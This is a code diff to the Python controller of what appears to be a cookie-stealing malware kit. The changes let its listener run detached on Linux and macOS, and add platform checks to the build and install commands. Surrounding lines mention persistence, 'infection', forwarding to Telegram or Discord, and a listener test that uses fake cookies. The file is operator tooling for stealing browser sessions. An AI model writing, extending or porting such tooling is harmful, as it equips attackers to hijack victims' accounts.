@@ -419,11 +419,16 @@ def start_listener(port, telegram=None, discord=None):
         cmd += ["--telegram", telegram]
     if discord:
         cmd += ["--discord", discord]
-    proc = subprocess.Popen(
-        cmd,
-        cwd=HERE,
-        creationflags=0x00000010  # CREATE_NEW_CONSOLE — listener gets its own window
-    )
+    # Windows: CREATE_NEW_CONSOLE gives the listener its own window (can't be
+    # killed by closing the main terminal). Linux/macOS: creationflags is not
+    # supported at all -- start_new_session detaches the listener from this
+    # terminal instead; it logs on its own, so no console output is lost.
+    kwargs = {}
+    if sys.platform == "win32":
+        kwargs["creationflags"] = 0x00000010  # CREATE_NEW_CONSOLE
+    else:
+        kwargs["start_new_session"] = True
+    proc = subprocess.Popen(cmd, cwd=HERE, **kwargs)
     time.sleep(2)
     if proc.poll() is not None:
         log("[-] listener failed to start")
@@ -1168,16 +1173,22 @@ def interactive_loop():
                 log("usage: persist on|off (current: %s)" % ("on" if persist else "off"))
 
         elif cmd == "build":
-            log("[*] running build.bat...")
-            ret = subprocess.call(["cmd", "/c", BUILD], cwd=HERE)
-            if ret == 0:
-                log("[+] build OK")
+            if sys.platform != "win32":
+                log("[-] build needs Windows (MSVC + build.bat). On Linux use the prebuilt")
+                log("    bin/ copied from a Windows build machine -- infection works without it.")
             else:
-                log("[-] build failed (exit %d)" % ret)
+                log("[*] running build.bat...")
+                ret = subprocess.call(["cmd", "/c", BUILD], cwd=HERE)
+                if ret == 0:
+                    log("[+] build OK")
+                else:
+                    log("[-] build failed (exit %d)" % ret)
 
         elif cmd == "install":
-            log("[*] running install.bat...")
-            subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)
+            if sys.platform != "win32":
+                log("[-] install.bat is Windows-only. On Linux run: ./install.sh")
+            else:
+                subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)
 
         elif cmd == "test-listener":
             # Start listener on a test port and send fake cookies
